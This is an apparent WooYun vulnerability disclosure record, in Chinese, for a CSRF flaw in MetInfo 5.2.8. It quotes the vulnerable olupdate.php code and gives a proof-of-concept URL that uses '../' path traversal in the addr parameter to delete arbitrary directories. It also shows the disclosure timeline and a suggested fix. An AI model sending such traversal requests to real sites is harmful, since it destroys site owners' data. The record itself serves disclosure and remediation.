{"id": 51233, "wybug_id": "wooyun-2014-075277", "wybug_title": "Metinfo一处CSRF可删除任意目录 #2", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "BadCat", "wybug_date": "2014-09-09 11:49", "wybug_open_date": "2014-12-08 11:50", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-08：\t细节向公众公开  简要描述： Metinfo因某处CSRF而造成可删除随意目录/整站 详细说明：  官方最新的 5.2.8 (测试通过)来看看存在问题的代码metinfo/system/olupdate.php\nelse if($action=='update'){/*文件更新 注升级包中admin文件不需要改名，直接写admin*/\t$adminfile=$url_array[count($url_array)-2];\tinclude \"../update/$addr/dlfilelist.txt\";\t$file_error[0]=0;\tforeach($strs as $addrskey=>$strsval){\t\t\t$strsvalto=readmin($strsval,$adminfile,2);\t\t$str=file_get_contents(\"../update/$addr/$strsval\");\t\tif(!file_put_contents(\"../../$strsvalto\",$str)){\t\t\t$file_error[0]=1;\t\t\t$file_error[2]=$strsvalto;\t\t}\t}\tif($file_error[0]==1){\t\tforeach($strs as $addrskey=>$strsval){\t\t\t\t$strsvalto=readmin($strsval,$adminfile,2);\t\t\t$str=file_get_contents(\"../update/$addr/dateback/$strsvalto\");\t\t\tif($str){\t\t\t\tfile_put_contents(\"../../$strsvalto\",$str);\t\t\t}\t\t\telse{\t\t\t\tunlink(\"../../$strsvalto\");\t\t\t}\t\t}\t\trequire_once '../system/database/global.func.php';\t\tif(file_exists(\"../update/$addr/sqlist.php\"))include \"../update/$addr/sqlist.php\";\t\tforeach($sqlfile as $sqlkey=>$sqlval){\t\t\t$sql=file_get_contents($sqlval);\t\t\tsql_execute($sql);\t\t}\t\tdl_error(\"{$file_error[2]}{$lang_updaterr14}\",$type,$olid,$ver,$addr,$action);\t}\t$str=file_get_contents(\"../update/$addr/update.php\");\tif($str!='No Date'){\t\tinclude \"../update/$addr/update.php\";\t}\tif($type==1){\t\t$db->query(\"update $met_config set value='$ver' where name='metcms_v'\");\t\t$authinfo=$db->get_one(\"SELECT * FROM $met_otherinfo where id=1\");\t\t$met_file='/dl/record_dl.php';\t\t$post_data = array('cmd'=>'sys','url'=>$met_weburl,'code'=>$authinfo['authcode'],'key'=>$authinfo['authpass'],'ver'=>$ver);\t\tcurl_post($post_data,10);\t\t\t\t$num=1;\t\t$random = met_rand(6);\t\t$date=date('Ymd',time());\t\trequire_once '../system/database/global.func.php';\t\tdo{\t\t\t$sqldump = '';\t\t\t$startrow = '';\t\t\t$statistics1=$tablepre.'visit_day';\t\t\t$statistics2=$tablepre.'visit_detail';\t\t\t$statistics3=$tablepre.'visit_summary';\t\t\t$tables=tableprearray($tablepre);\t\t\t$sizelimit=2048;\t\t\t$tableid = isset($tableid) ? $tableid - 1 : 0;\t\t\t$startfrom = isset($startfrom) ? intval($startfrom) : 0;\t\t\t$tablenumber = count($tables);\t\t\tfor($i = $tableid; $i < $tablenumber && strlen($sqldump) < $sizelimit * 1000; $i++){\t\t\t\tif($tables[$i]==$statistics1||$tables[$i]==$statistics2||$tables[$i]==$statistics3)continue;\t\t\t\t$sqldump .= sql_dumptable($tables[$i], $startfrom, strlen($sqldump));\t\t\t\t$startfrom = 0;\t\t\t}\t\t\t$startfrom = $startrow;\t\t\t$tableid = $i;\t\t\tif(trim($sqldump)){\t\t\t\t$version='version:'.$ver;\t\t\t\t$sqldump = \"#MetInfo.cn Created {$version} \\n#{$met_weburl}\\n#{$tablepre}\\n# --------------------------------------------------------\\n\\n\\n\".$sqldump;\t\t\t\t$bakfile = \"../databack/{$con_db_name}_{$date}_{$random}_{$num}.sql\";\t\t\t\tfile_put_contents($bakfile, $sqldump);\t\t\t}\t\t\t$num++;\t\t}\t\twhile(trim($sqldump));\t\t\t}else if($type==2){\t\t$query=\"select * from $met_app where no=$olid and download=0\";\t\t$app=$db->get_one($query);\t\t$query=\"select * from $met_app where no=$olid and download=1\";\t\tif($db->get_one($query)){\t\t\t$query=\"update $met_app set name='$app[name]',ver='$app[ver]',img='$app[img]',info='$app[info]',file='$app[file]',power='$app[power]',sys='$app[sys]',site='$app[site]',url='$app[url]' where no='$app[no]' and download=1\";\t\t\t$db->query($query);\t\t}\t\telse{\t\t\t$query=\"insert into $met_app set name='$app[name]',no='$app[no]',ver='$app[ver]',img='$app[img]',info='$app[info]',file='$app[file]',power='$app[power]',sys='$app[sys]',site='$app[site]',url='$app[url]',download=1\";\t\t\t\t$db->query($query);\t\t}\t\t$query=\"select * from $met_admin_table where usertype=3\";\t\t$result=$db->query($query);\t\twhile($list=$db->fetch_array($result)){\t\t\t$list[admin_type_tmp]='-'.$list[admin_type].'-';\t\t\tif(stripos($list[admin_type_tmp],'-s142-')!==false){\t\t\t\t$list[admin_type]=$list[admin_type].'-a'.$app[no];\t\t\t\t$query=\"update $met_admin_table set admin_type='$list[admin_type]' where id='$list[id]'\";\t\t\t\t$db->query($query);\t\t\t}\t\t}\t\t$met_file='/dl/record_dl.php';\t\t$post_data = array('cmd'=>'app','addr'=>$addr);\t\tcurl_post($post_data,10);\t}\tdeldir(\"../update/$addr/\"); // 漏洞在这里， $addr 可控\tunlink(\"../../update.php\");\tunlink(\"../../sql.sql\");\tchecksumdel($type);\techo $lang_updaterr15.\"<script type=\\\"text/javascript\\\">setTimeout(function (){olupdate('$olid','$ver','testc');},500);</script>\";\t}else if($action=='error'){\tdl_error('',$type,$olid,$ver,$addr,$action);}\n然后构造CSRF请求\nhttp://localhost/metinfo/admin/system/olupdate.php?action=update&addr=../../testfolder\n   漏洞证明：  首先创建个叫 \"testfolder\"的目录\n\n然后发起这请求，尝试删除这目录\nhttp://localhost/metinfo/admin/system/olupdate.php?action=update&addr=../../testfolder\n\n\n然后看看目录还存在不\n\n成功了，目录被删除了！   修复方案：  过滤 \n..\n 字符   版权声明：转载请注明来源 BadCat@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-09-14 09:22 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}